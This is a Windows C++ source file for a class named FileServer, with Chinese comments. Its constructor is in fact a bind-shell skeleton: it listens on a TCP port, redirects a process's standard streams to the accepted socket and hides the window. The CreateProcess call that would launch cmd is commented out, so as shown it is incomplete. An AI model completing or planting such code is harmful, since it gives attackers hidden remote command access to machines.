#include "stdafx.h"
#include "FileServer.h"


FileServer::FileServer()
{
}

FileServer::FileServer(int port)
{
	WSADATA WSADa;    //这个结构被用来存储被WSAStartup函数调用后返回的Windows Sockets数据。后面的基本上差不多就不解释，不懂请大家自行百度
	sockaddr_in SockAddrIn;
	SOCKET CSocket, SSocket;
	int iAddrSize;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;

	//分配内存，初始化数据
	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&WSADa, sizeof(WSADATA));

	//加载ws2_32.dll
	WSAStartup(0x0202, &WSADa);

	//设置本地信息和绑定协议,建立socket,代码如下:
	SockAddrIn.sin_family = AF_INET;
	SockAddrIn.sin_addr.s_addr = INADDR_ANY;
	SockAddrIn.sin_port = htons(port);
	CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	//设置绑定端口
	bind(CSocket, (sockaddr *)&SockAddrIn, sizeof(SockAddrIn));

	//设置服务器端监听端口
	listen(CSocket, 1);
	iAddrSize = sizeof(SockAddrIn);

	//开始连接远程服务器，并配置隐藏窗口结构体
	SSocket = accept(CSocket, (sockaddr *)&SockAddrIn, &iAddrSize);

	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

	StartupInfo.hStdInput = (HANDLE)SSocket;
	StartupInfo.hStdOutput = (HANDLE)SSocket;
	StartupInfo.hStdError = (HANDLE)SSocket;

	//CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
	Sleep(5000);
	bool flag = (WaitForSingleObject(ProcessInfo.hProcess, INFINITE) == WAIT_OBJECT_0);
	cout << "waitforsingleobject" << flag << endl;

	CloseHandle(ProcessInfo.hProcess);

	CloseHandle(ProcessInfo.hThread);



	//关闭进程句柄：

	closesocket(CSocket);

	closesocket(SSocket);
	cout << "cmd监听退出" << endl;
	WSACleanup();
}



FileServer::~FileServer()
{
}
